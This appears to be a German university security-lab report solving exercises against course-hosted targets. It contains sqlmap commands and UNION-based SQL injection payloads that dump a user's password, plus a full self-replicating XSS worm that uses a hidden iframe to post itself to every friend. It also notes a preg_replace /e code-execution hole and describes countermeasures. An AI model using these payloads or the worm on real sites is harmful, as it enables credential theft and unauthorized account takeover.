\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage{todo}
\usepackage[ngerman]{babel}
\usepackage[left=2cm]{geometry}

\usepackage{listings}
\usepackage{color}
\definecolor{lightgray}{rgb}{.9,.9,.9}
\definecolor{darkgray}{rgb}{.4,.4,.4}
\definecolor{purple}{rgb}{0.65, 0.12, 0.82}

\lstdefinelanguage{JavaScript}{
  keywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},
  keywordstyle=\color{blue}\bfseries,
  ndkeywords={class, export, boolean, throw, implements, import, this},
  ndkeywordstyle=\color{darkgray}\bfseries,
  identifierstyle=\color{black},
  sensitive=false,
  comment=[l]{//},
  morecomment=[s]{/*}{*/},
  commentstyle=\color{purple}\ttfamily,
  stringstyle=\color{red}\ttfamily,
  morestring=[b]',
  morestring=[b]"
}

\lstset{
   language=JavaScript,
   backgroundcolor=\color{lightgray},
   extendedchars=true,
   basicstyle=\footnotesize\ttfamily,
   showstringspaces=false,
   showspaces=false,
   numbers=left,
   numberstyle=\footnotesize,
   numbersep=9pt,
   tabsize=2,
   breaklines=true,
   showtabs=false,
   captionpos=b
}


\author{Christoph Robbert 6577945, Peter Stilow 6500440}
\title{Protokoll 2}
\begin{document}
\maketitle
 
\section*{Aufgabe 1}

\subsection*{a)}
\begin{itemize}
	\item Die \textit{Union} Klausel kann zum extrahieren von Daten benutzt werden. Das ursprüngliche Anfrage wird so abgeändert, dass ihre Ergebnisse oder Teilergebnisse mit den Ergebnissen einer anderen (vom Angreifer bestimmten) Abfrage vereint werden. Da die Ergebnisse nur vereint werden, bleibt die Struktur der resultierenden Tabelle gleich und die Anwendung gibt die Ergebnisse des durch \textit{Union} angehängten \textit{SELECT} Statements mit aus.
	\item Wenn der Angreifer weiß, wie viele Spalten die eigentliche Anfrage hatte, kann er eine Injection zusammenstellen, die wieder genauso viele Spalten als Ergebnis hat. Dies ist wichtig, da die \textit{Union} Klausel bei allen \textit{SELECT} anfragen die gleiche Anzahl an Spalten benötigt, um diese miteinander zu verbinden.

Zusätzlich werden die Daten aus den Anfragen selten direkt dem Nutzer gezeigt. Meistens werden sie noch durch eine Logik der Anwendung verarbeitet und aufbereitet. Wenn die Injection nun nicht die richtige Spaltenanzahl hat werden die meisten Anwendung die Darstellung abbrechen und nur einen Fehler zeigen. Wenn das Ziel des Angriffs eine Manipulation der Daten ist, kann dies ausreichen. Will der Angreifer aber Daten aus der Datenbank erhalten, will er diese auch angezeigt bekommen.
	\item Die Anwendung wird z.B. den ersten Eintrag der zurückgegebenen Tabelle als Information auf der Seite anzeigen lassen (was im Normalfall die korrekten Daten der Original-Anfrage sein sollten). Durch die \textit{Union} Klausel werden dem Ergebnis (also von SQL zurückgegebenen Tabelle) weitere Einträge eingefügt. Sollten diese z.B. an erster Stelle einsortiert worden sein, werden an Stelle der Daten aus der Original-Anfrage eben die Daten des Angreifers angezeigt.
	
Durch Umsortierung der zurückgegebenen Tabelle kann man so beliebige Einträge an die Stelle schieben, die auf der Seite angezeigt werden. Hierfür kann man z.B. den \textit{LIMIT} Befehl benutzen, so dass nur gewünschte Einträge im Ergebnis übrig bleiben und so von der Seite ausgewählt und angezeigt werden müssen. Hinter dem \textit{LIMIT} Befehl beendet man einfach die Anfrage durch Auskommentieren der übrigen Anfrage (z.B. mit \# oder -\,-).
\end{itemize}

\subsection*{b)}
Wir sind zunächst mal im Browser mal auf den Shop gegangen und haben geschaut, was er überhaupt macht. Man musste unten Nmap oder Wireshark auswählen und dann auf "`Details ansehen"' klicken. Hierdurch wurde man auf die Seite "`details\_tools.php"' weitergeleitet und bekommt ein paar Daten über das ausgewählte Tool.

Durch das Firefox-plugin "`Tamper Data"' konnten wir herausfinden, dass als Post beim Wechsel auf die "'details\_tools.php"' der wert tool=1 (für Nmap) bzw tool=2 (für Wireshark) übergeben werden. Dies können wir ausnutzen, um mit sqlmap die Datenbank(en) anzuschauen. Hierfür benutzen wir zunächst folgenden Befehl:

\begin{verbatim}
sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --tables
\end{verbatim}

Dieser Befehl gibt uns sowohl die vorhandenen Datenbanken, als auch die dazu gehörigen Tabellen:

\begin{verbatim}
Database: webshop
[2 tables]
+---------------------------------------+
| artikel                               |
| logs                                  |
+---------------------------------------+
\end{verbatim}

\begin{verbatim}
Database: secureuserdata
[1 table]
+---------------------------------------+
| accessdata                            |
+---------------------------------------+
\end{verbatim}

\begin{verbatim}
Database: information_schema
[28 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEY_COLUMN_USAGE                      |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+
\end{verbatim}

\begin{verbatim}
Database: mysql
[23 tables]
+---------------------------------------+
| user                                  |
| columns_priv                          |
| db                                    |
| event                                 |
| func                                  |
| general_log                           |
| help_category                         |
| help_keyword                          |
| help_relation                         |
| help_topic                            |
| host                                  |
| ndb_binlog_index                      |
| plugin                                |
| proc                                  |
| procs_priv                            |
| servers                               |
| slow_log                              |
| tables_priv                           |
| time_zone                             |
| time_zone_leap_second                 |
| time_zone_name                        |
| time_zone_transition                  |
| time_zone_transition_type             |
+---------------------------------------+
\end{verbatim}

Die erste Datenbank (webshop) sah nicht wichtig für Benutzerdaten aus, da sie als Tabellen nur "`artikel"' und "`logs"' besaß. Die nächste Datenbank jedoch hieß \textit{secureuserdata} und besaß eine Tabelle "`accessdata"'.
Diese Tabelle haben wir zunächst nach Passwörtern durchsuchen lassen (mit dem -\,-passwords befehl):

\begin{verbatim}
sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --passwords
-D secureuserdata -T accessdata
\end{verbatim}

Es gab einige Ergebnisse, allerdings keins mit dem Namen "`jack"' (sondern nur so etwas wie "`root"', "`phpmyadmin"' usw.). Da alle auf diese weise gefundenen Passwörter gehashed waren haben wir die Tabelle für weitere Hinweise einfach mal so via -\,-dump Befehl ausgeben lassen. Dabei haben wir den Benutzer "`jack"' angegeben:

\begin{verbatim}
sqlmap -u hackshop.seclab.uni-paderrborn.de/details\_tools.php --data=tool=1 --dump -D
secureuserdata -T accessdata -U jack
\end{verbatim}

Das Ergebnis war der Eintrag "`jack"' mit der id 3 und dem Passwort "`london"'. Demnach wurde das Passwort wohl unverschlüsselt in der Tabelle abgelegt.


Alternative: direkt über die Internetseite Query's abschicken (da wir SQL-Statements angeben sollten).

Zunächst galt es herauszufinden, wie viele Spalten der Tabelle die ursprüngliche Anfrage aus der Datenbank abfragt, damit wir unseren UNION Befehl einbauen können. Durch einfaches Testen von UNION Injections mit verschiedener Spaltenanzahl bekamen wir Fehlermeldungen:

\begin{verbatim}
MySQL-Error: The used SELECT statements have a different number of columns
\end{verbatim}

Als wir mit 4 Spalten keine Meldung bekamen wussten wir, dass die original Abfrage also mit 4 Spalten ausgeführt wurde. Jetzt galt es herauszufinden, welche Typen in welchen Spalten benutzt wurden, da auch diese in dem UNION Befehl identisch sein müssen. Die erste Spalte war nicht richtig nachzuvollziehen und ergab keine Ausgabe, die zweite Spalte jedoch konnte mit einem String belegt werden und ergab eine Ausgabe beim Namen der Tool-Beschreibung. Den Rest der Spalten haben wir auf NULL gelassen.

Jetzt konnten wir beginnen die "`information\_schema"' Tabelle zu benutzen und Datenbanken sowie Tabellen abzufragen. Den LIMIT Befehl benutzten wir, um die einzelnen Zeilen der Ausgabe durchlaufen zu können und ihren Inhalt ausgegeben zu bekommen. Wir begannen also mit:

\begin{verbatim}
'UNION SELECT NULL,schema_name,NULL,NULL FROM information_schema.schemata LIMIT 0,1;#
\end{verbatim}

Das gab uns zunächst den Datenbank-Namen "`information\_schema"' aus. Wir testeten weiter, bis der Befehl:

\begin{verbatim}
'UNION SELECT NULL,schema_name,NULL,NULL FROM information_schema.schemata LIMIT 2,1;#
\end{verbatim}

den gesuchten Datenbank-Namen "`secureuserdata"' als Name des Tool's ausgegeben hat. Diesen konnten wir für weitere Abfragen nutzen, z.B. zunächst, um die Tabellen in dieser Datenbank herauszubekommen:

\begin{verbatim}
'UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='secureuserdata';#
\end{verbatim}

Glücklicherweise gab uns diese Anfrage direkt den Namen "`accessdata"' zurück, so dass wir nicht lange mit dem LIMIT Befehl alle Einträge durchgehen mussten. Aus dieser Tabelle wollten wir jetzt die einzelnen Spalten abfragen, die zur Verfügung stehen:

\begin{verbatim}
'UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='accessdata' AND table_schema='secureuserdata' LIMIT 1,1;#
\end{verbatim}

ergab die Spalte "`user"', und:

\begin{verbatim}
'UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='accessdata' AND table_schema='secureuserdata' LIMIT 2,1;#
\end{verbatim}

ergab die Spalte "`password"'. Hiermit wussten wir, dass in dieser Tabelle also die Passwörter der einzelnen Benutzer gespeichert wurden. Da wir den Benutzer "`jack"' suchten, haben wir einfach mal den Befehl:

\begin{verbatim}
'UNION SELECT NULL,user,password,NULL FROM secureuserdata.accessdata WHERE user='jack';#
\end{verbatim}

eingegeben, und siehe da, als Tool Name erschien der Benutzer "`jack"' und als Tool Beschreibung sein Passwort "`london"'. Alternativ hätten wir auch die einzelnen Tabelleneinträge wieder mit dem Limit Befehl durchgehen können, wie z.B.:

\begin{verbatim}
'UNION SELECT NULL,user,password,NULL FROM secureuserdata.accessdata LIMIT 1,1;#
\end{verbatim}

das Ergebnis für den Benutzer "`paul"' gewesen wäre.


\subsection*{c)}

Maßnahmen für die Sicherung des Shops gegen solche Angriffe wie in Teil b) wären einfach gewesen, wenn man die Werte, die über POST an die "`details\_tools.php"' Seite gegeben wurden, überprüft hätte. So hätte man z.B. alle ' Zeichen (oder für andere Angriffe auch weitere Sonderzeichen) escapen können. Hierfür gibt es in php bereits vorgefertigte Befehle, falls man das nicht per Hand machen will (wäre aber auch sicherer, um nichts zu vergessen).

In diesem Szenario wird allerdings auch einzig und allein der Wert 1 bzw. 2 für den Parameter "`tool"' übergeben. Selbst bei mehr als nur den 2 Tools wäre in diesem Parameter nur eine Zahl erlaubt, so dass man alle ungültigen Zeichen, also alles, was keine Zahl ist, hätte entfernen können, oder dann die gesamte Abfrage verworfen worden sein könnte, bevor sie als wirkliche SQL-Anfrage an die Datenbank gegangen wäre.

\section*{Aufgabe 2}

\subsection*{a)}

Versand: Do.28 November 15.54 von peter\_bernd1@hell.sex nach peter\_bernd2@hell.sex.


Das Listing \ref{berndbookworm} zeigt unsere Version des Berndbookworm. Dabei enthält das Listing die initiale Nachricht. Wir benutzen ein iFrame um die Website \texttt{http://berndbook.seclab.uni-paderborn.de/send.php} mit den Anmeldedaten vom aktuellen Benutzer aufzurufen. Damit dies nicht auffällt verstecken wir den iFrame per CSS Befehlen. Danach laden wir jQuery nach um uns die Arbeit mit den Website Elementen zu vereinfachen. In Zeile 8 fängt unser eigentliches Angriffskript an. Die Funktion \texttt{reproduction} führt die eigentliche Reproduktion aus. Es setzt die selbe Nachricht noch einmal zusammen. Dabei wird der aktuelle Parameter n um eins verringert. Dies sorgt dafür, dass sich das Skript nur \textit{b} mal verbreitet. Anschließend setzt das Skript diese Nachricht in das Formular auf der Unterseite \texttt{send.php} ein. Dann werden alle Checkboxen, die die Freunde repräsentiert ausgefüllt und das Formular abgeschickt. Damit die leere Nachricht den Benutzern nicht sofort auffällt haben wir einen Text ("CHello my freend!") und ein Bild in die Nachricht eingefügt.

\begin{lstlisting}[caption=Berndbookworm, label=berndbookworm]
CHello my freend!
<img src="https://alcapwn.de/logo.png" />
<iframe src="http://berndbook.seclab.uni-paderborn.de/send.php" name="send_in_a_box" style="visibility:hidden;" width="0" height="0"></iframe>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js">
</script>

<script type="text/javascript">

function reproduction(n){
	if (n >0){
		reproduction_function = reproduction.toString();
		iframe_string = "CHello my freend!<img src=\"https://alcapwn.de/logo.png\"\/><iframe src=\"http://berndbook.seclab.uni-paderborn.de/send.php\" name=\"send_in_a_box\" style=\"visibility:hidden;\" width=\"0\" height=\"0\"></iframe>";
		jquery_string = "<script type=\"text/javascript\" src=\"http://code.jquery.com/jquery-1.10.2.min.js\"><\/script>";
		script_start = "<script type=\"text/javascript\">";
		function_call = "$('body').attr('onload','reproduction(" + (n-1) + ");');"
		script_end = "<\/script>";
		msg = iframe_string + jquery_string + script_start + reproduction_function + function_call + script_end;
		$('iframe').contents().find('textarea').val(msg);
		$('iframe').contents().find('input[type=checkbox]').click();
		$("iframe").contents().find("input[type=submit]").click()
	}
}

$('body').attr('onload','reproduction(2);');
</script>
\end{lstlisting}

\subsection*{b)}
Eine Möglichkeit die Ausbreitungsgeschwindigkeit zu reduzieren wäre die Nachricht beim sehen nur mit einer gewissen Wahrscheinlichkeit weiterzusenden. Über diese Wahrscheinlichkeit lässt sich dann die Geschwindigkeit regulieren. Um sicherzustellen, dass jeder User die Nachricht auch bekommt/weiterschickt, muss man dafür sorgen, dass der User die Nachricht nicht löscht bevor sie weitergeschickt wurde. Dies kann man erreichen, indem man die Nachricht vor dem User versteckt. Dafür könnte man per JavaScript die Website so anpassen, dass die Nachricht nicht angezeigt wird bis sie weitergeschickt wurde.

\section*{Aufgabe 3}

Der Leetspeakgenerator enthält eine Sicherheitslücke in der 1337.php. Die verwendete Funktion preg\_replace, die in Zeile 16 mit dem Modifikator "`\textit{e}"' aufgerufen wird, kann dazu ausgenutzt werden. Damit wir einfacher auf 1337.php Datei zugreifen konnten, benutzten wir einen RESTClient und bauten die Anfrage an die 1337.php nach. 
\end{document}